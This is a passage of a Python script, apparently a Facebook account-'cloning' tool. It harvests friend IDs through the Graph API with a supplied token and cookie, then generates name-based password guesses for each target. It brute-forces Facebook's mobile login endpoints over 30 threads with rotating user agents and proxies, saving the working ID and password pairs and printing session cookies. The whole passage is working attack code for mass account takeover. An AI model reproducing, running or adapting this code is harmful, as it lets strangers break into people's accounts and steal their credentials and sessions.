    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        exit()
    try:
        print('\033[0;91m==================')
        jum = int(input(' \033[97;1m[\033[92;1m•\033[97;1m] ENTER TARGET AMOUNT  : '))
        print('\033[0;91m==================')
    except ValueError:
        print('\033[0;91m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum < 1 or jum > 100000000:
        print('\033[0;91m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        kl = input(' \033[97;1m[\033[92;1m•\033[97;1m] INPUT UID ' + str(yz) + ' : ')
        uid.append(kl)
    for userr in uid:
       # try:
            col = ses.get(
                'https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0],
                cookies={'cookies': cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id'] + '|' + mi['name'])
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:
                    continue

            print('\033[0;91m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\033[0;91m==================')
        print(f' \033[97;1m[\033[92;1m•\033[97;1m] TOTAL ID : \u001b[36m' + str(len(id)) + '\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError, IOError):
        print('\033[0;91m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()


# -------------[ CRACK-FROM-FILE ]------------------#

def crack_file():
    print('\033[0;91m==================')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;32m[ Put File Example:  /sdcard/EMON VAI.txt  Etc...]')
    o = input('\033[97;1m[\033[92;1m+\033[97;1m] INPut FILE NAME :\033[92;1m ')
    try:
        lin = open(o).read().splitlines()
    except:
        print('\033[0;91m==================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()


# -------------[ PENGATURAN-IDZ ]---------------#

def setting():
    print('\033[0;91m=============================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mCLONING FOR ONLY OLD IDz")
    print("\033[97;1m[\033[92;1m2\033[97;1m] CLONING FOR ONLY NEW IDz")
    print("\033[97;1m[\033[92;1m3\033[97;1m] \033[0;92mCLONING FOR MIX IDz")
    print('\033[0;91m=============================')
    hu = input('\033[97;1m[\033[92;1m+\033[97;1m]CHOOSE :\033[92;1m ')
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2', '02']:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = (bcm - 1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [\033[0;92mCookies Show \033[0;91mCP ID Not Show\033[1;37m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    # os.system("xdg-open https://youtube.com/@emontechbdofficial146")
    if hc in ['1', '01']:
        method.append('mobile')
    elif hc in ['2', '02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit()


# -------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m " + uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m " + date)
    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ', str(len(id)))
    print(
        "\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m" + time.strftime(
            "%H:%M") + " " + tag)
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
    print(f'\033[97;1m[\033[97;1m•\033[97;1m] \033[1;92mTool version 0.2')
    print('\033[0;97m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + '12')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append(nmf)
                    pwv.append('*' + nmf + '#')
                    pwv.append('57273200')
                    pwv.append(frs + '@123')
                    pwv.append(frs + '@1234')
                    pwv.append(frs + '@12345')
                    pwv.append(frs + '@123456')
                    pwv.append(frs + '@@123')
                    pwv.append(frs + '@')
                    pwv.append(frs + '@@')
                    pwv.append(frs + '@@@')
                    pwv.append(frs + '@@@@')
                    pwv.append(frs + '@@@@@')
                    pwv.append(frs + '@@@@@@')
                    pwv.append(frs + '@#')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '11')
                    pwv.append(frs + '111')
                    pwv.append(frs + '1111')
                    pwv.append(frs + '##')
                    pwv.append(frs + '###')
                    pwv.append(frs + '####') 
                    pwv.append(frs + '#####') 
                    pwv.append(frs + '######') 
                    pwv.append('@' + nmf + '#')
                    pwv.append('@' + nmf + '@')
                    pwv.append('*' + nmf + '#')
            else:
                if len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs + '12')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
                    pwv.append(frs + '12345')
                    pwv.append(frs + '123456')
                    pwv.append(nmf)
                    pwv.append('*' + nmf + '#')
                    pwv.append('57273200')
                    pwv.append(frs + '@123')
                    pwv.append(frs + '@1234')
                    pwv.append(frs + '@12345')
                    pwv.append(frs + '@123456')
                    pwv.append(frs + '@@123')
                    pwv.append(frs + '@')
                    pwv.append(frs + '@@')
                    pwv.append(frs + '@@@')
                    pwv.append(frs + '@@@@')
                    pwv.append(frs + '@@@@@')
                    pwv.append(frs + '@@@@@@')
                    pwv.append(frs + '@#')
                    pwv.append(frs + '1122')
                    pwv.append(frs + '11')
                    pwv.append(frs + '111')
                    pwv.append(frs + '1111')
                    pwv.append(frs + '##')
                    pwv.append(frs + '###')
                    pwv.append(frs + '####')
                    pwv.append(frs + '#####') 
                    pwv.append(frs + '######') 
                    pwv.append('@' + nmf + '#')
                    pwv.append('@' + nmf + '@')
                    pwv.append('*' + nmf + '#')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree, idf, pwv)
            else:
                pool.submit(crackfree, idf, pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m' + time.strftime("%H:%M") + " " + tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s ' % (ok))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s ' % (cp))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    os.system("python nono.py")
    exit()


# --------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;92m{bo}[File•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'x.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 
                     'x-fb-rlafr': '0',
                     'access-control-allow-origin': '*',
                     'facebook-api-version': 'v17.0',
                     'strict-transport-security': 'max-age=15552000; preload',
                     'pragma': 'no-cache',
                     'cache-control': 'private, no-cache, no-store, must-revalidate',
                     'x-fb-request-id': 'AGAb1r5gST5f28zghRUGGlI',
                     'x-fb-trace-id': 'BxuXlSKY1W9',
                     'x-fb-rev': '1008295290',
                     'x-fb-debug': '8e3oC8c55BGj3V1DOvQ0T3rsDRCPe0nNssVFSnLirvR2mN7qOfgNEz0FkqKjNG8eSp00BtdAG7W9pGwSURyhiA==','viewport-width': '980',
                     'sec-ch-ua': '"Not A;Brand";v="24", "Chromium";v="116"',
                     'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                     'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1',
                     'user-agent': ua,
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                     'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1',
                     'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br',
                     'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[EMON VAI-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[EMON VAI-Ok🔥] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Hacke,  Ok,id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1


# ------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf, pwv):
    global loop, ok, cp
    sys.stdout.write(
        f"\r{H}[EMON VAI-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({"Host": 'm.facebook.com',
                                "x-fb-rlafr": "0",
                                "access-control-allow-origin": "*",
                                "facebook-api-version": "v17.0",
                                "strict-transport-security": "max-age=15552000; preload",
                                "pragma": "no-cache",
                                "cache-control": "private, no-cache, no-store, must-revalidate",
                                "x-fb-request-id": "AGAb1r5gST5f28zghRUGGlI",
                                "x-fb-trace-id": "BxuXlSKY1W9",
                                "x-fb-rev": "1008295290",
                                "x-fb-debug": "8e3oC8c55BGj3V1DOvQ0T3rsDRCPe0nNssVFSnLirvR2mN7qOfgNEz0FkqKjNG8eSp00BtdAG7W9pGwSURyhiA==",
                                "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US,en;q=0.9"})
            p = ses.get(
                'https://x.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), "uid": idf,
                     "next": "https://m.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pw, }
            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 
                     'x-fb-rlafr': '0',
                     'access-control-allow-origin': '*',
                     'facebook-api-version': 'v17.0',
                     'strict-transport-security': 'max-age=15552000; preload',
                     'pragma': 'no-cache',
                     'cache-control': 'private, no-cache, no-store, must-revalidate',
                     'x-fb-request-id': 'AGAb1r5gST5f28zghRUGGlI',
                     'x-fb-trace-id': 'BxuXlSKY1W9',
                     'x-fb-rev': '1008295290',
                     'x-fb-debug': '8e3oC8c55BGj3V1DOvQ0T3rsDRCPe0nNssVFSnLirvR2mN7qOfgNEz0FkqKjNG8eSp00BtdAG7W9pGwSURyhiA==','viewport-width': '980',
                     'sec-ch-ua': '"Not A;Brand";v="24", "Chromium";v="116"',
                     'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                     'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1',
                     'user-agent': ua,
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                     'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1',
                     'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br',
                     'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
                          cookies={'cookie': koki}, headers=heade, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;93m[{time.strftime("%H:%M")}•EMON VAI-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•EMON VAI-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Hack,  id"')
                open('OK/' + okc, 'a').write(idf + ' • ' + pw + '\n')
                break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


# -----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__ == '__main__':
    try:
        os.mkdir('OK')
    except:
        pass
    try:
        os.mkdir('CP')
    except:
        pass
    try:
        os.system('touch .prox.txt')
    except:
        pass
menu()
